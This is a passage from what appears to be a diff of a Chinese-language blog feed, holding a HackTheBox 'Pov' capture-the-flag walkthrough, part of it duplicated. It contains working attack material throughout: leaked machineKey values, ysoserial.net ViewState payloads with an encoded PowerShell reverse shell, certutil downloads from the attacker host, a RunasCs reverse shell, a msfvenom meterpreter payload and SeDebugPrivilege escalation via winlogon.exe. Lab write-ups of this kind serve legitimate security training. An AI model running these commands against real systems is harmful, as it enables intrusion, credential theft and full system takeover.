+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://pov.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.6</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   true</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.pov.htb Status: 302 [Size: 152] [--&gt; http://dev.pov.htb/portfolio/]</span><br></pre></td></tr></table></figure>
+
+<p>那么我们修改下<code>/etc/hosts</code>的域名，成功访问</p>
+<p>我们注意到有文件下载功能，尝试文件读取</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405172354851.png"></p>
+<p>但是并不能读取一些常见的敏感文件路径</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405173617729.png"></p>
+<p>我们利用<code>wappalyzer</code>插件扫描出web框架为<code>AST.NET</code>的4.0版本，并且上述请求中的参数也是相关联</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405174707954.png"></p>
+<p>网上搜到<code>如何利用__VIEWSTATE</code> <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------">参考文章</a></p>
+<p><strong>什么是 ViewState</strong></p>
+<blockquote>
+<p>ViewState 是 ASP.NET 中用于维护页面和控制网页数据的默认机制。在呈现页面的 HTML 期间，页面的当前状态和回发期间要保留的值将序列化为 base64 编码的字符串。然后，这些字符串将放置在隐藏的 ViewState 字段中。</p>
+</blockquote>
+<p>ViewState 信息可以通过以下属性或其组合来表征：</p>
+<ul>
+<li><p>基数64：当 <code>EnableViewStateMac</code> 和 <code>ViewStateEncryptionMode</code> 属性都设置为 false 时，将使用此格式。</p>
+</li>
+<li><p>Base64 + MAC（消息认证码）已启用：通过将 <code>EnableViewStateMac</code> 属性设置为 true 来实现 MAC 的激活。这为 ViewState 数据提供完整性验证。</p>
+</li>
+<li><p>Base64 + 加密：当 <code>ViewStateEncryptionMode</code> 属性设置为 true 时，将应用加密，以确保 ViewState 数据的机密性。</p>
+</li>
+</ul>
+<p>文章提到在版本<code>4.5</code>以及<code>EnableViewStateMac=true &amp; ViewStateEncryptionMode=false</code>情况下，密钥在<code>web.config</code>文件上</p>
+<p>（由于<code>../</code>被过滤，直接双写绕过）</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405185300956.png"></p>
+<p>web.config</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;default.aspx&quot; /&gt;</span><br><span class="line">    &lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</span><br><span class="line">    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; validation=&quot;SHA1&quot; validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; /&gt;</span><br><span class="line">  &lt;/system.web&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;httpErrors&gt;</span><br><span class="line">            &lt;remove statusCode=&quot;403&quot; subStatusCode=&quot;-1&quot; /&gt;</span><br><span class="line">            &lt;error statusCode=&quot;403&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;http://dev.pov.htb:8080/portfolio&quot; responseMode=&quot;Redirect&quot; /&gt;</span><br><span class="line">        &lt;/httpErrors&gt;</span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://dev.pov.htb/portfolio&quot; exactDestination=&quot;false&quot; childOnly=&quot;true&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用 YSoSerial.Net 攻击 <a href="https://github.com/pwntester/ysoserial.net">工具链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping 10.10.14.46&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意：如果有发送参数 <code>_VIEWSTATEGENERATOR</code> ，用 <code>--generator=8E0F0FA3</code> 替换<code>--apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot;</code>。实际上bp抓包可以看到确实有，但是换成<code>--generator</code>参数却不行</p>
+<p>在windows系统生成payload</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405192312405.png"></p>
+<p>复制到bp上，并且在本地监听tun0（即10.10.14.46）的流量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405192620484.png"></p>
+<p>经过一番尝试，发现bash的反弹shell无法成功，那么猜测是目标机器为windows</p>
+<p>用powershell去弹 <a href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58#file-mkpsrevshell-py">脚本链接</a></p>
+<p><img src="/article/Pov-HackTheBox/image-20240405194230876.png"></p>
+<p>然后再生成payload放到bp上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA2ACIALAAxADAAMgA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405194432185.png"></p>
+<p>经过一番查找在<code>C:\Users\sfitz\Documents</code>路径下发现有用信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class="line">  &lt;Obj RefId=&quot;0&quot;&gt;</span><br><span class="line">    &lt;TN RefId=&quot;0&quot;&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=&quot;UserName&quot;&gt;alaading&lt;/S&gt;</span><br><span class="line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用powershell语法解密将password转换成明文 <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext">参考文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br></pre></td></tr></table></figure>
+
+<p>成功得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\sfitz\Documents&gt; $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br><span class="line">UserName       : alaading</span><br><span class="line">Password       : f8gQ8fynP44ek1m3</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : </span><br></pre></td></tr></table></figure>
+
+<p>接下来我们使用RunasCs进行用户切换</p>
+<p>首先切换到Downloads目录，然后下载本地的RunasCs文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/RunasCs.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Pov-HackTheBox/image-20240405200822175.png"></p>
+<p>然后切换用户并弹shell到777端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.46:777</span><br></pre></td></tr></table></figure>
+
+<p>重点：这里用<code>powershell</code>弹，如果用<code>cmd.exe</code>到后面会发现没有<code>SeDebugPrivilege</code>权限</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405200949897.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405201600635.png"></p>
+<p>查看下当前用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State   </span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>
+
+<p><strong>SeDebugPrivilege</strong></p>
+<blockquote>
+<p>在Windows操作系统中，SeDebugPrivilege是一种特别强大的权限，可以让持有该权限的进程读取或修改几乎所有其他进程的内存空间，即使是那些以系统或管理员级别运行的进程。在Metasploit框架下，拥有了这个权限，就可以对系统的SAM数据库进行读取</p>
+</blockquote>
+<p>由于靶机<code>SeDebugPrivilege</code>是<code>enabled</code>，所以我们就直接提权就行了</p>
+<p>若要启动该权限，需要执行下面脚本 <a href="https://book.hacktricks.xyz/v/cn/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#qi-yong-suo-you-ling-pai">参考文章</a></p>
+<p>EnableAllTokenPrivs.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/</span><br><span class="line">$definition = @&#x27;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Set_TokenPermission</span><br><span class="line">&#123;</span><br><span class="line">    public class SetTokenPriv</span><br><span class="line">    &#123;</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,</span><br><span class="line">        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, Pack = 1)]</span><br><span class="line">        internal struct TokPriv1Luid</span><br><span class="line">        &#123;</span><br><span class="line">            public int Count;</span><br><span class="line">            public long Luid;</span><br><span class="line">            public int Attr;</span><br><span class="line">        &#125;</span><br><span class="line">        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;</span><br><span class="line">        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;</span><br><span class="line">        internal const int TOKEN_QUERY = 0x00000008;</span><br><span class="line">        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;</span><br><span class="line">        public static void EnablePrivilege()</span><br><span class="line">        &#123;</span><br><span class="line">            bool retVal;</span><br><span class="line">            TokPriv1Luid tp;</span><br><span class="line">            IntPtr hproc = new IntPtr();</span><br><span class="line">            hproc = Process.GetCurrentProcess().Handle;</span><br><span class="line">            IntPtr htok = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            List&lt;string&gt; privs = new List&lt;string&gt;() &#123;  &quot;SeAssignPrimaryTokenPrivilege&quot;, &quot;SeAuditPrivilege&quot;, &quot;SeBackupPrivilege&quot;,</span><br><span class="line">            &quot;SeChangeNotifyPrivilege&quot;, &quot;SeCreateGlobalPrivilege&quot;, &quot;SeCreatePagefilePrivilege&quot;,</span><br><span class="line">            &quot;SeCreatePermanentPrivilege&quot;, &quot;SeCreateSymbolicLinkPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;,</span><br><span class="line">            &quot;SeDebugPrivilege&quot;, &quot;SeEnableDelegationPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;, &quot;SeIncreaseBasePriorityPrivilege&quot;,</span><br><span class="line">            &quot;SeIncreaseQuotaPrivilege&quot;, &quot;SeIncreaseWorkingSetPrivilege&quot;, &quot;SeLoadDriverPrivilege&quot;,</span><br><span class="line">            &quot;SeLockMemoryPrivilege&quot;, &quot;SeMachineAccountPrivilege&quot;, &quot;SeManageVolumePrivilege&quot;,</span><br><span class="line">            &quot;SeProfileSingleProcessPrivilege&quot;, &quot;SeRelabelPrivilege&quot;, &quot;SeRemoteShutdownPrivilege&quot;,</span><br><span class="line">            &quot;SeRestorePrivilege&quot;, &quot;SeSecurityPrivilege&quot;, &quot;SeShutdownPrivilege&quot;, &quot;SeSyncAgentPrivilege&quot;,</span><br><span class="line">            &quot;SeSystemEnvironmentPrivilege&quot;, &quot;SeSystemProfilePrivilege&quot;, &quot;SeSystemtimePrivilege&quot;,</span><br><span class="line">            &quot;SeTakeOwnershipPrivilege&quot;, &quot;SeTcbPrivilege&quot;, &quot;SeTimeZonePrivilege&quot;, &quot;SeTrustedCredManAccessPrivilege&quot;,</span><br><span class="line">            &quot;SeUndockPrivilege&quot;, &quot;SeUnsolicitedInputPrivilege&quot;, &quot;SeDelegateSessionUserImpersonatePrivilege&quot; &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);</span><br><span class="line">            tp.Count = 1;</span><br><span class="line">            tp.Luid = 0;</span><br><span class="line">            tp.Attr = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">            foreach (var priv in privs)</span><br><span class="line">            &#123;</span><br><span class="line">                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);</span><br><span class="line">                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$type = Add-Type $definition -PassThru</span><br><span class="line">$type[0]::EnablePrivilege() 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>在本地开启http服务上传该脚本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/EnableAllTokenPrivs.ps1</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>.\EnableAllTokenPrivs.ps1</code>即可</p>
+<p>回到题目，我们利用msf先在本地生成马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=5555 -f exe &gt; exploit.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后本地开启http服务，上传到靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/exploit.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Pov-HackTheBox/image-20240405203424722.png"></p>
+<p>在本地启动一个msf数据库&amp;console</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>接着依次执行去反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.46</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>开启监听后在靶机运行<code>.\exploit.exe</code>，反弹成功</p>
+<p><img src="/article/Pov-HackTheBox/image-20240406124840953.png"></p>
+<p>我们<code>ps</code>查看下靶机正在运行的进程，注意到<code>winlogon.exe</code>文件</p>
+<blockquote>
+<p>winlogon.exe 是 Windows 的登录系统进程，它在用户登录时启动，并处理用户登录和注销的过程。当用户输入用户名和密码后，winlogon.exe 验证用户的凭据，并启动用户环境。它还负责加载用户配置文件、启动用户的用户界面和其他关联的系统任务。</p>
+</blockquote>
+<p><img src="/article/Pov-HackTheBox/image-20240406125030326.png"></p>
+<p>然后使用<code>migrate 548</code>命令将shell移到winlogon.exe进程里</p>
+<p>执行shell命令，成功提权拿到flag</p>
+<p><img src="/article/Pov-HackTheBox/image-20240406125219057.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NSSRound#20 Basic</title>
     <url>/article/NSSRound-20-Basic.html</url>
     <content><![CDATA[<p>114514</p>
@@ -1835,137 +1968,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Pov-HackTheBox</title>
-    <url>/article/Pov-HackTheBox.html</url>
-    <content><![CDATA[<p>AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权</p>
-<span id="more"></span>
-
-<h1 id="Pov-HackTheBox"><a href="#Pov-HackTheBox" class="headerlink" title="Pov-HackTheBox"></a>Pov-HackTheBox</h1><p><strong>信息搜集</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.251</span><br></pre></td></tr></table></figure>
-
-<p>扫描结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">80/tcp open  tcpwrapped</span><br><span class="line">|_http-title: pov.htb</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br></pre></td></tr></table></figure>
-
-<p>我们将域名<code>pov.htb</code>添加到<code>/etc/hosts</code>方便访问</p>
-<p>打开后发现是企业网站，扫出来子域名<code>dev.pov.htb</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://pov.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.6</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   true</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.pov.htb Status: 302 [Size: 152] [--&gt; http://dev.pov.htb/portfolio/]</span><br></pre></td></tr></table></figure>
-
-<p>那么我们修改下<code>/etc/hosts</code>的域名，成功访问</p>
-<p>我们注意到有文件下载功能，尝试文件读取</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405172354851.png"></p>
-<p>但是并不能读取一些常见的敏感文件路径</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405173617729.png"></p>
-<p>我们利用<code>wappalyzer</code>插件扫描出web框架为<code>AST.NET</code>的4.0版本，并且上述请求中的参数也是相关联</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405174707954.png"></p>
-<p>网上搜到<code>如何利用__VIEWSTATE</code> <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------">参考文章</a></p>
-<p><strong>什么是 ViewState</strong></p>
-<blockquote>
-<p>ViewState 是 ASP.NET 中用于维护页面和控制网页数据的默认机制。在呈现页面的 HTML 期间，页面的当前状态和回发期间要保留的值将序列化为 base64 编码的字符串。然后，这些字符串将放置在隐藏的 ViewState 字段中。</p>
-</blockquote>
-<p>ViewState 信息可以通过以下属性或其组合来表征：</p>
-<ul>
-<li><p>基数64：当 <code>EnableViewStateMac</code> 和 <code>ViewStateEncryptionMode</code> 属性都设置为 false 时，将使用此格式。</p>
-</li>
-<li><p>Base64 + MAC（消息认证码）已启用：通过将 <code>EnableViewStateMac</code> 属性设置为 true 来实现 MAC 的激活。这为 ViewState 数据提供完整性验证。</p>
-</li>
-<li><p>Base64 + 加密：当 <code>ViewStateEncryptionMode</code> 属性设置为 true 时，将应用加密，以确保 ViewState 数据的机密性。</p>
-</li>
-</ul>
-<p>文章提到在版本<code>4.5</code>以及<code>EnableViewStateMac=true &amp; ViewStateEncryptionMode=false</code>情况下，密钥在<code>web.config</code>文件上</p>
-<p>（由于<code>../</code>被过滤，直接双写绕过）</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405185300956.png"></p>
-<p>web.config</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;default.aspx&quot; /&gt;</span><br><span class="line">    &lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</span><br><span class="line">    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; validation=&quot;SHA1&quot; validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; /&gt;</span><br><span class="line">  &lt;/system.web&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;httpErrors&gt;</span><br><span class="line">            &lt;remove statusCode=&quot;403&quot; subStatusCode=&quot;-1&quot; /&gt;</span><br><span class="line">            &lt;error statusCode=&quot;403&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;http://dev.pov.htb:8080/portfolio&quot; responseMode=&quot;Redirect&quot; /&gt;</span><br><span class="line">        &lt;/httpErrors&gt;</span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://dev.pov.htb/portfolio&quot; exactDestination=&quot;false&quot; childOnly=&quot;true&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>使用 YSoSerial.Net 攻击 <a href="https://github.com/pwntester/ysoserial.net">工具链接</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping 10.10.14.46&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
-
-<p>注意：如果有发送参数 <code>_VIEWSTATEGENERATOR</code> ，用 <code>--generator=8E0F0FA3</code> 替换<code>--apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot;</code>。实际上bp抓包可以看到确实有，但是换成<code>--generator</code>参数却不行</p>
-<p>在windows系统生成payload</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405192312405.png"></p>
-<p>复制到bp上，并且在本地监听tun0（即10.10.14.46）的流量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>
-
-<p>成功命令执行</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405192620484.png"></p>
-<p>经过一番尝试，发现bash的反弹shell无法成功，那么猜测是目标机器为windows</p>
-<p>用powershell去弹 <a href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58#file-mkpsrevshell-py">脚本链接</a></p>
-<p><img src="/article/Pov-HackTheBox/image-20240405194230876.png"></p>
-<p>然后再生成payload放到bp上</p>
